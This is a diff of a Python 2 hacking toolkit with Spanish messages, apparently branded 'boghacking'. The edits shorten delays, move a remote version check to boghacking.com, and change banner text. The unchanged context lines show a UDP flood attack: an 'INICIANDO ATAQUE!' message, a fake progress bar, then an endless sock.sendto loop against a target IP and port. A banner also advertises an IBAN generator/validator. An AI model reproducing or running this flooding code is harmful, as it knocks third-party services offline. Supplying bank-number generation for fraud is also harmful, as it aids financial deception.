@@ -36,9 +36,10 @@ msg00 = "OOO\n"
 for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(2)
+        time.sleep(0.5)
 
-vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')
+vers=requests.get('https://boghacking.com/verschk.txt').text.encode('utf-8')
+
 #potasio=requests.get('https://pastebin.com/raw/UyhX5Pjt').text.encode('utf-8')
 """
 ms0g ="Checking Your Version (%s) "%vers
@@ -257,15 +258,15 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         os.system("cls")
         os.system("echo INICIANDO ATAQUE! ")
         print "[                    ] 0% "
-        time.sleep(5)
+        time.sleep(1)
         print "[=====               ] 25%"
-        time.sleep(5)
+        time.sleep(2)
         print "[==========          ] 50%"
-        time.sleep(5)
-        print "[===============     ] 75%"
-        time.sleep(5)
-        print "[====================] 100%"
         time.sleep(3)
+        print "[===============     ] 75%"
+        time.sleep(4)
+        print "[====================] 100%"
+        time.sleep(5)
         sent = 0
         while True:
              sock.sendto(bytes, (ip,port))
@@ -290,7 +291,7 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         || || |_) / ___ \| |\  |_____| |_| | |___| |\  |
         |___|____/_/   \_\_| \_|      \____|_____|_| \_|                                               
         [$] BOG IBAN GEN/VALIDATOR.
-        [$] https://www.Bogpro.com/
+        [$] https://www.boghacking.com/
         '''
 
         print logs1
@@ -645,7 +646,7 @@ SSSS    TT   EEEE A  A DDD'''
             if vers=="meisecaca" :
                 print('EL SERVER TIENE PROTECCION CONTRA ESTE DDOS') 
             else:
-                print("ATACANDOOOOOOOOO UWU")
+                print("PAQUETE ENVIADO CORRECTAMENTE")
                 function()
         function()
 
